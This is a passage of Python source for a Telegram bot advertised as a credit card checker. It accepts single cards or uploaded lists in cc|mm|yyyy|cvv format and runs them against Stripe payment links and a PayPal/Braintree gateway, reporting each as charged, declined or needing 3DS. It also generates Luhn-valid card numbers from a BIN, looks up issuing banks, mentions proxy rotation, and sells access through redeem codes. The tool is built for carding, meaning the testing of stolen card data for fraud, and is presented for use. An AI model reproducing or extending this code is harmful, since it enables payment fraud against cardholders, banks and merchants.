        bin_info = bin_lookup_with_cache(card['number'])
        bin_scheme = bin_info.get('scheme', 'Unknown')
        bin_type = bin_info.get('type', 'Unknown')
        bin_brand = bin_info.get('brand', 'Unknown')
        bin_country = bin_info.get('country', 'Unknown')
        bin_bank = bin_info.get('bank', 'Unknown')
        bin_emoji = bin_info.get('emoji', '')

        if success:
            udata["charged"] += 1
            status_text = "CHARGED!"
            status_icon = "[+]"
            response_text = "APPROVED"
        else:
            udata["declined"] += 1
            status_text = "DECLINED"
            status_icon = "[-]"
            response_text = msg

        output = f"""{status_icon} Gateway: PayPal Jazz
-------------------------------
{status_icon} Card: <code>{card_str}</code>
{status_icon} Status: {status_text}
{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
-------------------------------
{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
{status_icon} Bank: {bin_bank}
{status_icon} Country: {bin_country} {bin_emoji}
-------------------------------
{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
{status_icon} By: yacinedev Checker
-------------------------------"""

        await status_msg.edit_text(output, parse_mode="HTML")

    except Exception as e:
        await status_msg.edit_text(f"{fb('Error')}: <code>{str(e)}</code>", parse_mode="HTML")


async def cmd_px(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص ملف عبر PayPal Jazz - /px (رفع ملف)"""
    await update.message.reply_text(
        f"{fb('PayPal Jazz Mass Check')}\n\n"
        f"{fb('Send a .txt file with cards.')}\n"
        f"{fb('Format')}: <code>cc|mm|yyyy|cvv</code>\n"
        f"{fb('One card per line.')}",
        parse_mode="HTML"
    )
    context.user_data["state"] = "px"


async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/bin 424242</code>", parse_mode="HTML")
        return
    
    bin_num = context.args[0].strip()
    if not bin_num.isdigit() or len(bin_num) < 6:
        await update.message.reply_text(f"{fb('Invalid BIN! Use 6+ digits.')}", parse_mode="HTML")
        return
    
    status_msg = await update.message.reply_text(f"{fb('Looking up BIN')} {bin_num}...", parse_mode="HTML")
    info = bin_lookup_with_cache(bin_num)
    
    text = f"""{fb('BIN Lookup')}: <code>{bin_num[:6]}</code>
━━━━━━━━━━━━━━
{fb('Scheme')}: <b>{info['scheme']}</b>
{fb('Type')}: <b>{info['type']}</b>
{fb('Brand')}: <b>{info['brand']}</b>
{fb('Country')}: <b>{info['country']}</b> {info['emoji']}
{fb('Bank')}: <b>{info['bank']}</b>
━━━━━━━━━━━━━━"""
    await status_msg.edit_text(text, parse_mode="HTML")


async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"{fb('Usage')}: <code>/gen 424242 [count]</code>\n{fb('Max 10 cards.')}", parse_mode="HTML")
        return
    
    bin_prefix = context.args[0].strip()
    count = int(context.args[1]) if len(context.args) > 1 and context.args[1].isdigit() else 10
    count = min(count, 10)
    cards = gen_card_from_bin(bin_prefix, count)
    
    if not cards:
        await update.message.reply_text(fb("Could not generate cards. Check BIN."))
        return
    
    cards_text = "\n".join([f"├─ <code>{c}</code>" for c in cards])
    text = f"""{fb('Card Generator')}
━━━━━━━━━━━━━━
{fb('BIN')}: <code>{bin_prefix}</code>
{fb('Generated')}: <b>{len(cards)}</b>

{cards_text}
└─
━━━━━━━━━━━━━━
{fb('All cards pass Luhn check.')}"""
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: /redeem XXXX-XXXX-XXXX-XXXX")
        return
    
    code = context.args[0].upper()
    
    if code in generated_codes:
        code_data = generated_codes[code]
        
        if time.time() > code_data["expires_at"]:
            await update.message.reply_text(fb("Code has expired!"))
            return
        
        if code_data["used_by"] is not None:
            await update.message.reply_text(fb("Code already used!"))
            return
        
        user = get_user(user_id)
        user["plan"] = code_data["plan"]
        generated_codes[code]["used_by"] = user_id
        
        await update.message.reply_text(
            f"{fb('Code redeemed successfully!')}\n"
            f"{fb('Plan')}: {code_data['plan']}\n"
            f"{fb('Valid for')}: {code_data['days']} days"
        )
    else:
        await update.message.reply_text(fb("Invalid code!"))


async def cmd_stopcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stop_all_checks()
    await update.message.reply_text(fb("Stop signal sent. Checks will halt."))

# ============================================================
# ADMIN COMMANDS
# ============================================================

async def cmd_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(f"{fb('Usage')}: /code Premium 30")
        return
    
    plan = context.args[0]
    try:
        days = int(context.args[1])
    except:
        await update.message.reply_text(fb("Days must be a number!"))
        return
    
    code = generate_redeem_code(plan, days)
    
    text = f"""
{fb('Code Generated Successfully!')}
━━━━━━━━━━━━━━
{fb('Code')}: <code>{code}</code>
{fb('Plan')}: {plan}
{fb('Days')}: {days}
{fb('Expires')}: {datetime.fromtimestamp(time.time() + (days * 86400)).strftime('%Y-%m-%d')}
━━━━━━━━━━━━━━
{fb('Share this code with users.')}
"""
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"{fb('Usage')}: /ban 123456789")
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text(fb("User ID must be a number!"))
        return
    
    banned_users.add(target_id)
    await update.message.reply_text(f"{fb('User banned')}: <code>{target_id}</code>", parse_mode="HTML")
    
    try:
        await context.bot.send_message(target_id, fb("You have been banned from using this bot."))
    except:
        pass


async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"{fb('Usage')}: /unban 123456789")
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text(fb("User ID must be a number!"))
        return
    
    if target_id in banned_users:
        banned_users.remove(target_id)
        await update.message.reply_text(f"{fb('User unbanned')}: <code>{target_id}</code>", parse_mode="HTML")
    else:
        await update.message.reply_text(fb("User not found in ban list"))


async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if not user_db:
        await update.message.reply_text(fb("No users found."))
        return
    
    text = f"{fb('Connected Users')} ({len(user_db)}):\n━━━━━━━━━━━━━━\n"
    for uid, data in user_db.items():
        status = "Banned" if uid in banned_users else "Active"
        text += f"ID: <code>{uid}</code> | {data['plan']} | {status}\n"
        text += f"Checks: {data['checks']} | Charged: {data['charged']}\n━━━━━━━━━━━━━━\n"
    
    if len(text) > 4000:
        text = text[:4000]
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    start_time = time.time()
    msg = await update.message.reply_text(fb("Testing bot speed..."))
    end_time = time.time()
    ping = (end_time - start_time) * 1000
    
    api_start = time.time()
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=5)
        api_ping = (time.time() - api_start) * 1000
        api_text = f"<b>{api_ping:.2f} ms</b>"
    except:
        api_text = "Failed"
    
    if ping < 500:
        status_text = "Excellent"
    elif ping < 1000:
        status_text = "Good"
    else:
        status_text = "Slow"
    
    text = f"""
{fb('Bot Speed Test Results')}
━━━━━━━━━━━━━━
{fb('Message Response')}: <b>{ping:.2f} ms</b>
{fb('Telegram API')}: {api_text}
{fb('Server Time')}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━
{fb('Status')}: {status_text}
"""
    await msg.edit_text(text, parse_mode="HTML")


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    total_users = len(user_db)
    total_checks = sum(u["checks"] for u in user_db.values())
    total_charged = sum(u["charged"] for u in user_db.values())
    total_declined = sum(u["declined"] for u in user_db.values())
    total_3ds = sum(u["_3ds"] for u in user_db.values())
    banned_count = len(banned_users)
    active_users = total_users - banned_count
    success_rate = (total_charged / total_checks * 100) if total_checks > 0 else 0
    
    text = f"""
{fb('Bot Statistics')}
━━━━━━━━━━━━━━
{fb('Users')}:
├─ Total: {total_users}
├─ Banned: {banned_count}
└─ Active: {active_users}

{fb('Checks')}:
├─ Total: {total_checks}
├─ Charged: {total_charged}
├─ Declined: {total_declined}
└─ 3DS: {total_3ds}

{fb('Success Rate')}: {success_rate:.1f}%

{fb('Time')}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━
"""
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    server_info = f"""
┌─────────────────────────────────┐
│         𝗦𝗘𝗥𝗩𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡         │
├─────────────────────────────────┤
│ 𝗢𝗦          : {platform.system()} {platform.release()}
│ 𝗣𝘆𝘁𝗵𝗼𝗻     : {sys.version.split()[0]}
│ 𝗛𝗼𝘀𝘁𝗻𝗮𝗺𝗲   : {platform.node()}
│ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗼𝗿  : {platform.processor() or 'Unknown'}
│ 𝗔𝗿𝗰𝗵𝗶𝘁𝗲𝗰𝘁𝘂𝗿𝗲 : {platform.machine()}
│ 𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻  : {BOT_TOKEN[:6]}••••••••••{BOT_TOKEN[-4:]}
│ 𝗔𝗱𝗺𝗶𝗻 𝗜𝗗   : {ADMIN_ID}
│ 𝗨𝘀𝗲𝗿𝘀      : {len(user_db)}
│ 𝗕𝗮𝗻𝗻𝗲𝗱    : {len(banned_users)}
│ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝘀 : {sum(u['checks'] for u in user_db.values())}
│ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : {sum(u['charged'] for u in user_db.values())}
│ 𝗨𝗽𝘁𝗶𝗺𝗲    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
└─────────────────────────────────┘
    """
    
    await update.message.reply_text(
        f"<code>{server_info}</code>",
        parse_mode="HTML"
    )


async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: /broadcast message")
        return
    
    message = " ".join(context.args)
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text(fb("Broadcasting..."))
    
    for uid in user_db:
        if uid in banned_users:
            continue
        try:
            await context.bot.send_message(uid, f"{fb('Announcement')}\n\n{message}", parse_mode="HTML")
            sent += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    
    await status_msg.edit_text(f"{fb('Broadcast Complete')}\nSent: {sent}\nFailed: {failed}")


async def cmd_backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    backup_data = {
        "users": {str(k): v for k, v in user_db.items()},
        "banned": list(banned_users),
        "gateways": gateways,
        "timestamp": datetime.now().isoformat()
    }
    
    backup_file = BytesIO(json.dumps(backup_data, indent=4).encode())
    backup_file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    await update.message.reply_document(
        document=InputFile(backup_file),
        caption=f"{fb('Backup created successfully!')}\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )


async def cmd_restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    await update.message.reply_text(fb("Restarting bot..."))
    logger.info("Bot restarting by admin command")
    await asyncio.sleep(1)
    os.execl(sys.executable, sys.executable, *sys.argv)


async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    global user_db, banned_users, generated_codes
    user_db = {}
    banned_users = set()
    generated_codes = {}
    
    await update.message.reply_text(fb("All data cleared successfully!"))

# ============================================================
# SHORTCUT COMMANDS
# ============================================================

async def cmd_gr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_code(update, context)

async def cmd_bu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_ban(update, context)

async def cmd_lu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_list(update, context)

async def cmd_sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_speed(update, context)

async def cmd_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_site(update, context)

# ============================================================
# MESSAGE AND DOCUMENT HANDLERS
# ============================================================

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state", "")
    text = update.message.text or ""
    
    if state == "chk":
        context.args = text.split()
        await cmd_chk(update, context)
        context.user_data["state"] = ""
    elif state == "pp":
        context.args = text.split()
        await cmd_pp(update, context)
        context.user_data["state"] = ""
    elif "|" in text and len(text.split("|")) >= 4:
        context.args = text.split()
        await cmd_chk(update, context)
    else:
        await update.message.reply_text(
            f"{fb('yacinedev Card Checker')}\n\n{fb('Use the menu or commands:')}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(fb("Tools"), callback_data="tools")],
                [InlineKeyboardButton(fb("Profile"), callback_data="profile")],
                [InlineKeyboardButton(fb("Settings"), callback_data="settings")],
                [InlineKeyboardButton(fb("About"), callback_data="about")],
            ]),
            parse_mode="HTML"
        )


async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    udata = get_user(user_id)
    document = update.message.document
    
    if not document.file_name.endswith(".txt"):
        await update.message.reply_text(fb("Please send .txt files only!"))
        return
    
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode("utf-8", errors="ignore")
    lines = [line.strip() for line in content.split("\n") if line.strip()]
    
    state = context.user_data.get("state", "")
    
    if state == "px":
        await process_paypal_mass(update, context, lines, user_id, udata)
    else:
        await process_mass(update, context, lines, user_id, udata)
    
    context.user_data["state"] = ""


async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list, user_id: int, udata: dict):
    valid_cards = [engine.parse(line) for line in lines if engine.parse(line)]
    
    if not valid_cards:
        await update.message.reply_text(fb("No valid cards found!"))
        return
    
    reset_stop()
    
    status_msg = await update.message.reply_text(
        f"{fb('Checking')} {len(valid_cards)} {fb('cards...')}",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(fb("⏹ STOP CHECK"), callback_data="mass_stop")]
        ])
    )
    
    charged_count = declined_count = _3ds_count = 0
    
    for idx, card in enumerate(valid_cards, 1):
        if is_stopped():
            await update.message.reply_text(fb("⏹ Mass check stopped by user."))
            break
        
        try:
            card_str, success, msg, charged = engine.check(card)
            udata["checks"] += 1
            
            bin_info = bin_lookup_with_cache(card['number'])
            bin_scheme = bin_info.get('scheme', 'Unknown')
            bin_type = bin_info.get('type', 'Unknown')
            bin_brand = bin_info.get('brand', 'Unknown')
            bin_country = bin_info.get('country', 'Unknown')
            bin_bank = bin_info.get('bank', 'Unknown')
            bin_emoji = bin_info.get('emoji', '')
            
            if success:
                charged_count += 1
                udata["charged"] += 1
                status_icon = "[+]"
                status_text = "CHARGED!"
            elif "3DS" in msg:
                _3ds_count += 1
                udata["_3ds"] += 1
                status_icon = "[~]"
                status_text = "3DS Required"
            else:
                declined_count += 1
                udata["declined"] += 1
                status_icon = "[-]"
                status_text = "DECLINED"
            
            result_output = f"""{status_icon} Card: {card_str} | {status_text} | {bin_scheme} | {bin_country}"""
            await update.message.reply_text(result_output, parse_mode="HTML")
            
            if idx % 5 == 0 or idx == len(valid_cards):
                try:
                    await status_msg.edit_text(
                        f"{fb('Checking...')} {idx}/{len(valid_cards)}\n"
                        f"{fb('Approved')}: {charged_count} | {fb('Declined')}: {declined_count} | {fb('3DS')}: {_3ds_count}",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton(fb("⏹ STOP CHECK"), callback_data="mass_stop")]
                        ])
                    )
                except:
                    pass
                await asyncio.sleep(0.3)
        except Exception as e:
            pass
    
    summary = f"""
{fb('Mass Check Complete')}
━━━━━━━━━━━━━━
{fb('Total')}: {len(valid_cards)}
{fb('Approved')}: {charged_count}
{fb('Declined')}: {declined_count}
{fb('3DS')}: {_3ds_count}
"""
    await update.message.reply_text(summary, parse_mode="HTML")


async def process_paypal_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list, user_id: int, udata: dict):
    """معالجة فحص PayPal Jazz الجماعي"""
    valid_cards = [engine.parse(line) for line in lines if engine.parse(line)]
    
    if not valid_cards:
        await update.message.reply_text(fb("No valid cards found!"))
        return
    
    status_msg = await update.message.reply_text(
        f"{fb('Checking via PayPal Jazz...')} {len(valid_cards)} {fb('cards')}",
        parse_mode="HTML"
    )
    
    charged_count = declined_count = 0
    
    for idx, card in enumerate(valid_cards, 1):
        try:
            card_str, success, msg, charged = engine.check(card, gateway="paypal_jazz")
            udata["checks"] += 1
            
            if success:
                charged_count += 1
                udata["charged"] += 1
                status_icon = "[+]"
                status_text = "CHARGED!"
            else:
                declined_count += 1
                udata["declined"] += 1
                status_icon = "[-]"
                status_text = "DECLINED"
            
            result_output = f"""{status_icon} PayPal Jazz | {card_str} | {status_text} | {msg}"""
            await update.message.reply_text(result_output, parse_mode="HTML")
            
            if idx % 5 == 0:
                try:
                    await status_msg.edit_text(
                        f"{fb('Checking...')} {idx}/{len(valid_cards)}\n"
                        f"{fb('Approved')}: {charged_count} | {fb('Declined')}: {declined_count}",
                        parse_mode="HTML"
                    )
                except:
                    pass
                await asyncio.sleep(0.3)
        except Exception as e:
            pass
    
    summary = f"""
{fb('PayPal Jazz Mass Check Complete')}
━━━━━━━━━━━━━━
{fb('Total')}: {len(valid_cards)}
{fb('Approved')}: {charged_count}
{fb('Declined')}: {declined_count}
"""
    await update.message.reply_text(summary, parse_mode="HTML")

# ============================================================
# BUTTON HANDLER
# ============================================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id in banned_users and data not in ["menu", "start"]:
        await query.message.reply_text(fb("You are banned!"))
        return

    if data == "menu":
        user = update.effective_user
        username = f"@{user.username}" if user.username else "N/A"
        udata = get_user(user_id)
        plan = udata["plan"]
        if user_id == ADMIN_ID:
            plan = "Admin"
        text = f"""{fb('Welcome')} {user.first_name}!
━━━━━━━━━━━━━━
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Status')}: {fb(plan)}
━━━━━━━━━━━━━━
{fb('Use the buttons below to navigate.')}"""
        menu = build_main_menu(user_id)
        send_colored_buttons(chat_id, text, menu)

    elif data == "tools":
        text = f"""
𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂
━━━━━━━━━━━━━━
├─ Single Check ➜ /chk
├─ Mass Check ➜ /mass
├─ BIN Lookup ➜ /bin
├─ Generator ➜ /gen
├─ PayPal Jazz ➜ /pp
├─ PayPal Mass ➜ /px
└─ Back ➜ /menu

𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝘁𝗼𝗼𝗹 𝗼𝗿 𝘂𝘀𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗱𝗶𝗿𝗲𝗰𝘁𝗹𝘆.
"""
        await query.message.reply_text(text, parse_mode="HTML")

    elif data == "profile":
        user = update.effective_user
        username = f"@{user.username}" if user.username else "N/A"
        udata = get_user(user_id)
        plan = udata["plan"]
        if user_id == ADMIN_ID:
            plan = "Admin"
        text = f"""{fb('Profile')}
━━━━━━━━━━━━━━
{fb('Name')}: {user.first_name}
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Plan')}: {fb(plan)}
{fb('Checks')}: {udata['checks']}
{fb('Charged')}: {udata['charged']}
{fb('Declined')}: {udata['declined']}
{fb('3DS')}: {udata['_3ds']}
{fb('Joined')}: {udata['registered']}
━━━━━━━━━━━━━━"""
        buttons = [[b_blue(fb("Back"), "menu")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "settings":
        text = f"""
𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗠𝗲𝗻𝘂
━━━━━━━━━━━━━━
├─ Shopify ➜ /shopify
├─ 3DS Lookup ➜ /3ds
├─ Site Management ➜ /site
├─ Proxy Management ➜ /proxy
├─ Other ➜ /other
└─ Back ➜ /menu

𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗼𝗿 𝘂𝘀𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗱𝗶𝗿𝗲𝗰𝘁𝗹𝘆.
"""
        await query.message.reply_text(text, parse_mode="HTML")

    elif data == "about":
        text = f"""{fb('yacinedev Card Checker v7.0')}

├─ {fb('Engine')}: Stripe Payment Link
├─ {fb('PayPal Jazz')}: PayPal/Braintree Gateway
├─ {fb('Version')}: 7.0
├─ {fb('Performance')}: Async | Multi-threading
├─ {fb('Security')}: Proxy Rotation | BIN Cache | Ban System
│
├─ {fb('Developer')}: yacinedev
└─ {fb('Built with precision.')}"""
        buttons = [[b_blue(fb("Back"), "menu")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "admin_panel":
        if str(user_id) != str(ADMIN_ID):
            await query.answer(fb("Admin only!"), show_alert=True)
            return
        
        text = f"""
𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹
━━━━━━━━━━━━━━
├─ Generate Code ➜ /gr
├─ Ban User ➜ /bu
├─ List Users ➜ /lu
├─ Speed ➜ /sp
├─ Site Info ➜ /st
├─ Stats ➜ /stats
├─ Broadcast ➜ /broadcast
├─ Backup ➜ /backup
├─ Restart ➜ /restart
├─ Clear ➜ /clear
└─ Back ➜ /menu

𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝘁𝗼𝗼𝗹 𝗼𝗿 𝘂𝘀𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗱𝗶𝗿𝗲𝗰𝘁𝗹𝘆.
"""
        await query.message.reply_text(text, parse_mode="HTML")

    elif data == "mass_stop":
        stop_all_checks()
        await query.answer(fb("⏹ Stopped!"), show_alert=True)

    elif data == "tool_chk":
        text = f"{fb('Single Card Check')}\n\n{fb('Send card in format:')}\n<code>cc|mm|yyyy|cvv</code>"
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)
        context.user_data["state"] = "chk"

    elif data == "tool_mass":
        text = f"{fb('Mass Check')}\n\n{fb('Send a .txt file with cards.')}"
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "tool_bin":
        text = f"{fb('BIN Lookup')}\n\n{fb('Send BIN number:')} <code>/bin 424242</code>"
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "tool_gen":
        text = f"{fb('Card Generator')}\n\n{fb('Generate cards from BIN:')} <code>/gen 424242 10</code>"
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "tool_pp":
        text = f"{fb('PayPal Jazz Check')}\n\n{fb('Send card in format:')}\n<code>cc|mm|yyyy|cvv</code>\n\n{fb('Or use command')}: /pp cc|mm|yyyy|cvv"
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)
        context.user_data["state"] = "pp"

    elif data == "tool_px":
        text = f"{fb('PayPal Jazz Mass Check')}\n\n{fb('Send a .txt file with cards.')}\n{fb('One card per line.')}\n{fb('Format')}: <code>cc|mm|yyyy|cvv</code>"
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)
        context.user_data["state"] = "px"

# ============================================================
# MAIN
# ============================================================

def main():
    print("""
yacinedev Card Checker Bot v7.0
Engine: Stripe Payment Link + PayPal Jazz
BIN Cache: Enabled
    """)
    
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[ERROR] Set BOT_TOKEN")
        return
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", cmd_chk))
    application.add_handler(CommandHandler("bin", cmd_bin))
    application.add_handler(CommandHandler("gen", cmd_gen))
    application.add_handler(CommandHandler("redeem", cmd_redeem))
    application.add_handler(CommandHandler("stopcheck", cmd_stopcheck))
    
    # PayPal Jazz Commands
    application.add_handler(CommandHandler("pp", cmd_pp))
    application.add_handler(CommandHandler("px", cmd_px))
    
    application.add_handler(CommandHandler("code", cmd_code))
    application.add_handler(CommandHandler("ban", cmd_ban))
    application.add_handler(CommandHandler("unban", cmd_unban))
    application.add_handler(CommandHandler("list", cmd_list))
    application.add_handler(CommandHandler("speed", cmd_speed))
    application.add_handler(CommandHandler("stats", cmd_stats))
    application.add_handler(CommandHandler("site", cmd_site))
    application.add_handler(CommandHandler("broadcast", cmd_broadcast))
    application.add_handler(CommandHandler("backup", cmd_backup))
    application.add_handler(CommandHandler("restart", cmd_restart))
    application.add_handler(CommandHandler("clear", cmd_clear))
    
    application.add_handler(CommandHandler("gr", cmd_gr))
    application.add_handler(CommandHandler("bu", cmd_bu))
    application.add_handler(CommandHandler("lu", cmd_lu))
    application.add_handler(CommandHandler("sp", cmd_sp))
    application.add_handler(CommandHandler("st", cmd_st))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    application.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    
    print("[+] Bot started successfully!")
    
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except KeyboardInterrupt:
        print("\n[!] Bot stopped by user")


if __name__ == "__main__":
    main()
